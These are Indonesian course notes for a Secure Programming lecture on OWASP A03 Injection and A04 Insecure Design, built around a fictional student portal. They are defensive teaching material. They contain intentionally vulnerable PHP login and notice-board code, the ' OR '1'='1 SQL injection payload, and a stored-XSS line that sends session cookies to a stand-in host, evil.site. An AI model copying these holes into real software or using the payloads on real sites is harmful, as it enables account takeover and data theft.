---
matkul: Secure Programming
minggu: 10
sks: 3
sumber: S10_Code Auditing based on OWASP Top 10 III.pptx
tags: [kuliah/secure-programming, minggu/w10]
status: draft
diproses: 2026-09-04
---

# W10 — Code Auditing based on OWASP Top 10 (III): A03 & A04

## Ringkasan
> - **Maya** (developer junior lain) bangun **CampusConnect**: mahasiswa login, cari kelas, posting di notice board. Jalan mulus pas demo, **tapi nggak pernah di-review keamanannya**.
> - Tiga fitur, tiga risiko: **Login & pencarian kelas** → **A03 SQL Injection**. **Postingan notice board** → **A03 Cross-Site Scripting**. **Alur reset password** → **A04 Insecure Design**.
> - **Injection** kejadian pas interpreter (SQL engine, browser, shell) nerima campuran perintah terpercaya + data nggak dipercaya, dan datanya bisa NGUBAH makna perintahnya.
> - **SQLi**: `' OR '1'='1` di kolom password bikin klausa `WHERE` selalu true — **login bisa dilewatin tanpa password valid**.
> - **XSS**: interpreternya browser korban, bukan database. Tiga jenis: **Stored, Reflected, DOM-based**. Contoh terkenal: **worm Samy (2005)**, nyebar ke 1 juta+ akun MySpace dalam ~20 jam.
> - **Insecure Design ≠ implementation bug.** Bug implementasi = kontrolnya ADA tapi salah kode. Cacat desain = kontrolnya **NGGAK PERNAH DIRANCANG** dari awal — nggak bisa di-patch, harus di-desain ulang.
> - Kunci pertahanan: SQLi → **parameterized query**. XSS → **context-aware output encoding**. Insecure design → **threat modeling** (bikin use-case DAN misuse-case).

## Konsep Kunci
| Istilah | Penjelasan Singkat |
| --- | --- |
| Injection | Interpreter nerima campuran perintah + data; data bisa ngubah makna perintah |
| SQL Injection | Injection yang targetnya adalah SQL engine/database |
| Cross-Site Scripting (XSS) | Injection yang targetnya adalah browser korban |
| Stored XSS | Payload tersimpan di server, disajikan ke SEMUA yang liat |
| Reflected XSS | Payload dipantulkan balik dari request (biasanya lewat link jahat) |
| DOM-based XSS | JavaScript sisi client nulis data nggak dipercaya ke halaman; server nggak pernah liat payload-nya |
| Insecure Design | Kategori risiko yang sumbernya kontrol yang NGGAK PERNAH dirancang, bukan bug koding |
| Threat modeling | Teknik nanya "gimana ini bisa disalahgunakan?" sebelum/selagi desain fitur |
| Misuse-case | Skenario gimana sebuah fitur BISA disalahgunakan (lawan dari use-case) |

## Isi

### Cerita: CampusConnect
Maya, developer junior, bikin **CampusConnect** — portal mahasiswa buat login, cari kelas, dan posting pesan di notice board. **Jalan sempurna pas demo. Tapi nggak pernah di-review keamanannya.**

**Misi hari ini:** baca kode Maya kayak auditor DAN penyerang. Cari cacatnya sebelum orang lain nemuin duluan.

**Tiga fitur portalnya, tiap satu nyimpen risiko OWASP berbeda:**
- **Login & pencarian kelas** — ngobrol ke database → **A03 SQL Injection**
- **Postingan notice board** — nge-render teks user di browser → **A03 Cross-Site Scripting**
- **Alur reset password** — workflow yang diputusin di whiteboard → **A04 Insecure Design**

### Fondasi: apa itu code auditing dan kenapa skill database-mu penting
**Code auditing** adalah review terstruktur, baris-per-baris, atas source code buat nemuin kelemahan keamanan sebelum penyerang nemuin. OWASP nyebut **source code review** sebagai cara terbaik buat deteksi cacat injection.

**Pertanyaan inti auditor: "Di mana data nggak dipercaya masuk — dan apa yang dia dapet kontrol?"**

**Trust boundary** = garis antara data yang kamu kontrol dan data yang disupply user. **Tiap bug injection hidup di garis ini.**

**Kamu udah tau bagian susahnya:**
- Dari kelas database — sebuah query punya **struktur** (keyword SQL) dan **data** (nilai)
- Insight keamanannya — serangan kejadian pas data user diizinin jadi **struktur**
- Di browser — buat XSS, "query"-nya itu HTML/JS yang dijalanin browser

### Injection: SQL Injection · Cross-Site Scripting
> "94% aplikasi yang dites punya bentuk injection; 274.000 kejadian di dataset OWASP."

**Konsep dulu: injection pas data disalahtafsir jadi perintah.** Sebuah interpreter (SQL engine, browser, shell) nerima campuran perintah terpercaya + data nggak dipercaya. Kalau datanya bisa ngubah makna perintahnya, itu injection.

1. **Untrusted input** — user ngetik ke form, URL, cookie, atau header
2. **Unsafe assembly** — aplikasi nempelin input ke perintah lewat string concatenation
3. **Interpreter executes** — engine ngejalanin struktur si penyerang seolah itu kode

**Rentan kalau:** input nggak divalidasi/disanitasi · dynamic query dibangun lewat concatenation · karakter khusus nggak di-escape buat interpreter itu.

### SQL Injection: baca kode login Maya sebagai auditor
```php
$user = $_POST['username'];
$pass = $_POST['password'];

$sql = "SELECT * FROM users
        WHERE name = '" . $user . "'
        AND pass = '" . $pass . "'";

$result = mysqli_query($conn, $sql); // dijalankan
```
**Bendera merah audit:** `$_POST` langsung masuk ke query. String concatenation ngebangun SQL-nya. Ada tanda kutip di sekitar input — **tapi nggak ada escaping**. Nggak ada parameterized/prepared statement.

Sekarang penyerang ngetik ini di kotak password:
```
' OR '1'='1
```
**Klausa `WHERE`-nya sekarang selalu true — login dilewatin tanpa password valid.**

**Gimana payload-nya nulis ulang query-nya:**
```sql
-- MAKSUD ASLI
... WHERE name='maya' AND pass='secret'

-- SETELAH DI-INJEKSI
... WHERE name='maya' AND pass='' OR '1'='1'
```

**Kenapa ini lebih dari sekadar bypass login:** **Read** — dump tabel lain: `UNION SELECT` buat nyolong nilai, email, hash password. **Modify/Delete** — ubah atau hapus record — OWASP nyatet serangan bisa ngubah atau ngehapus data. **Escalate** — panggil stored procedure atau pindah lebih dalam ke sistem.

### Kasus: SQL Injection — ini bukan hipotesis
- **Sony Pictures (2011)** — grup LulzSec ngelaporin breach sistem Sony lewat satu SQL injection, ngeksposkan volume besar data akun user — demonstrasi klasik input nggak disanitasi ngelawan database.
- **TalkTalk (2015)** — breach telekomunikasi UK yang eksploitasi SQL injection ngeksposkan data pribadi lebih dari seratus ribu pelanggan; nariknya denda regulasi rekor waktu itu.
- **Masih ranking sampe sekarang** — OWASP mempertahankan Injection di Top 10 (**A03:2021**). **CWE-89 (SQL Injection)** tetap salah satu weakness yang paling banyak dilaporin — puluhan tahun setelah teknik ini pertama kali didokumentasikan.

### Cross-Site Scripting: sama-sama cacat, interpreter beda
**Pergeseran kuncinya:** di SQLi, interpreternya database. Di XSS, interpreternya **browser korban**. Kalau input user berakhir di halaman tanpa di-escape, browser mungkin ngejalanin itu sebagai HTML atau JavaScript.

*CWE-79 · Improper Neutralization of Input During Web Page Generation*

**Hasilnya:** script si penyerang jalan dengan session korban — nyolong cookie, membajak akun, ngerusak halaman, atau ngarahin user.

**Tiga jenis yang perlu dikenali:**
- **Stored (persistent)** — payload disimpen di server (misal, postingan notice board) dan disajikan ke tiap orang yang liat
- **Reflected** — payload dipantulin balik dari request, sering lewat link jahat atau kotak pencarian
- **DOM-based** — JavaScript sisi client nulis data nggak dipercaya ke halaman; server nggak pernah liat payload-nya

### Cross-Site Scripting: notice board Maya nge-render postingan langsung
```php
$msg = $_POST['message'];
// disimpen ke DB, terus ditampilin ke semua orang:
echo "<div class='post'>" . $msg . "</div>";
```
**Bendera merah audit:** Input di-echo apa adanya ke HTML. Nggak ada `htmlspecialchars()`/encoding. **Tersimpan, jadi ngena ke semua pengunjung.**

Penyerang posting 'message' ini:
```html
<script>fetch('//evil.site/c?'+document.cookie)</script>
```
**Tiap mahasiswa yang buka notice board diam-diam ngirim session cookie mereka ke penyerang. Nggak perlu klik apa pun.**

### Kenapa XSS bisa skala besar — dan contoh terkenal
**Analisis auditor:** **Trust boundary dilanggar** — konten user jadi bagian markup yang bisa dieksekusi halamannya. **Jalan sebagai korban** — script mewarisi session, cookie, dan izin korban. **Stored = bisa nge-worm** — kalau payload-nya posting ulang dirinya sendiri, dia nyebar dari satu viewer ke viewer lain.

**Kasus nyata: worm Samy (2005).** Payload stored-XSS di MySpace nambahin penulisnya sebagai teman dan nyalin dirinya ke profil tiap korban. Dalam sekitar **20 jam**, dia udah nyebar ke lebih dari **1 juta akun** — salah satu malware paling cepet nyebar yang pernah tercatat.

**Pelajaran audit: satu field output yang nggak di-escape ngebolehin teks nggak dipercaya jadi kode yang nyebar sendiri. Perbaikannya adalah output encoding — persis yang Maya lewatkan.**

### Cacat yang nggak bisa di-patch, cuma bisa didesain ulang
> "Kategori baru 2021: risiko dari kontrol yang hilang atau nggak efektif desainnya — bukan bug implementasi."

**Konsep: cacat desain ≠ bug implementasi.** OWASP narik garis yang disengaja: desain yang aman tetep bisa punya bug implementasi, tapi **desain yang nggak aman nggak bisa diselametin sama kode yang sempurna** — kontrol yang dibutuhin emang nggak pernah ada buat ditulis.

| **Implementation bug** | **Design flaw** |
| --- | --- |
| Kontrolnya ADA tapi dikoding salah | Kontrol yang dibutuhin NGGAK PERNAH dirancang |
| Contoh: query yang lupa di-parameterize | Contoh: reset password pakai security question yang gampang ditebak |
| Bisa diperbaiki dengan ngedit baris kode itu | Nggak bisa di-patch — harus di-desain ulang |
| Ditemukan lewat code review & testing | Ditemukan lewat threat modeling, SEBELUM kode ditulis |

### Insecure Design: reset password Maya — cacatnya ada di rencananya
Desainnya (dari whiteboard, belum ada kode):
1. User masukin username-nya
2. App nanya: "Siapa nama hewan peliharaanmu?"
3. Kalau jawabannya cocok, tampilin form reset
4. Nggak ada rate limit, nggak ada konfirmasi email

**Tiap baris bisa dikoding dengan sempurna — dan tetep aja rusak.**

**Kenapa desain ini gagal:** **Rahasianya nggak rahasia** — nama hewan peliharaan gampang ditebak atau publik — banyak orang bisa tau (OWASP/NIST melarang security question). **Nggak ada batas penyalahgunaan** — kehilangan "kontrol atas frekuensi interaksi" (**CWE-799**) — penyerang bisa brute-force jawabannya. **Ada celah logika bisnis** — nggak ada verifikasi out-of-band yang ngiket request itu ke pemilik akun aslinya.

### Berpikir dalam misuse-case, bukan cuma use-case
Pencegahan inti OWASP buat cacat desain adalah **threat modeling**: buat tiap fitur, tanya bukan cuma "gimana ini dipakai?" tapi juga **"gimana ini bisa disalahgunakan?"**

- **Use-case** (yang direncanain Maya): "Mahasiswa yang lupa password jawab pertanyaan dan dapet akses balik."
- **Misuse-case** (yang penyerang lakuin): Cari nama hewan peliharaan korban dari media sosial. Atau bikin script buat nebak ribuan kali — nggak ada yang nyetop. Reset password-nya dan ambil alih akun. Nggak ada log, nggak ada alert, nggak ada rate limit yang nangkep.

**Contoh penyalahgunaan dunia nyata dari OWASP:** Booking 600 kursi bioskop buat ngelawan aturan deposit; bot scalper ngeborong stok — dua-duanya desain yang nggak pernah mikirin penyalahgunaan.

## Diagram & Visual
> [!warning] Deck ini nggak punya gambar non-dekoratif yang bisa diekstrak — kontennya semua teks dan blok kode.

## Istilah Khusus
| Istilah | Penjelasan |
| --- | --- |
| **`UNION SELECT`** | Teknik SQL injection buat ngegabungin hasil query jahat ke hasil query asli, biar bisa nyolong data dari tabel lain |
| **`document.cookie`** | Objek JavaScript yang nyimpen cookie halaman aktif; kalau kebaca script jahat, itu artinya session bisa dicuri |
| **Security question** | Pertanyaan "rahasia" (misal nama hewan peliharaan) yang OWASP/NIST anggap TIDAK aman buat verifikasi identitas |
| **Out-of-band verification** | Verifikasi lewat kanal terpisah (misal email/SMS) buat mastiin request beneran dari pemilik akun |
| **Paved road (secure design pattern)** | Kumpulan komponen/pola yang udah divetting dan aman, dipake ulang alih-alih bikin kontrol keamanan dari nol tiap kali |
| **CWE-799** | Kategori kerentanan "Improper Control of Interaction Frequency" — nggak ada batasan seberapa sering aksi tertentu bisa dicoba |

## Quiz Pemahaman
Level Bloom C4 ke atas.

1. **(C4 – Analisis)** Bandingkan payload SQLi (`' OR '1'='1`) dan payload XSS (`<script>fetch(...)</script>`). Keduanya "injection", tapi analisis: apa perbedaan INTERPRETER yang jadi korban di masing-masing kasus, dan kenapa fix-nya HARUS berbeda (parameterized query vs. output encoding) meskipun akar masalahnya sama-sama "data disalahartikan jadi perintah"?
2. **(C4 – Analisis)** Reset password Maya (security question, tanpa rate limit) dikategorikan A04 Insecure Design, bukan A03 Injection atau A07 Auth Failure. Analisis: kalau kode-nya diimplementasi dengan SEMPURNA (nggak ada bug SQLi, nggak ada XSS di form-nya), kenapa fiturnya TETEP rentan? Apa yang bikin ini beda dari bug implementasi biasa?
3. **(C5 – Evaluasi)** Sebuah tim udah nerapin `htmlspecialchars()` di SEMUA output HTML notice board CampusConnect. Evaluasi: apa ini CUKUP buat nutup ketiga jenis XSS (Stored, Reflected, DOM-based)? Kalau ada yang masih bisa lolos, jenis XSS mana, dan kenapa?
4. **(C5 – Evaluasi)** Bandingkan use-case vs misuse-case buat fitur "pencarian kelas" CampusConnect (bukan reset password). Tulis SATU use-case dan SATU misuse-case buat fitur pencarian ini, terus evaluasi: apa fitur pencarian ini juga berisiko jadi A04 Insecure Design, atau risikonya lebih ke A03 Injection? Jelasin bedanya.
5. **(C6 – Cipta)** Rancang ULANG alur reset password CampusConnect (bukan cuma nambah rate limit) supaya nggak ngulang kesalahan desain yang sama. Alur barumu harus jawab: gimana caranya verifikasi identitas TANPA security question, gimana caranya nyegah brute force, dan gimana caranya ngasih audit trail kalau ada percobaan reset yang mencurigakan.

## Versi Gue
<!-- JANGAN DISENTUH. Section ini diisi manual oleh pemilik vault. -->

## Terkait
- [[_SecureProgramming]]
- [[W09 - Code Auditing OWASP II]]
- [[W11 - Code Auditing OWASP IV]]
- [[SecureProgramming - Review dan Glosari]]
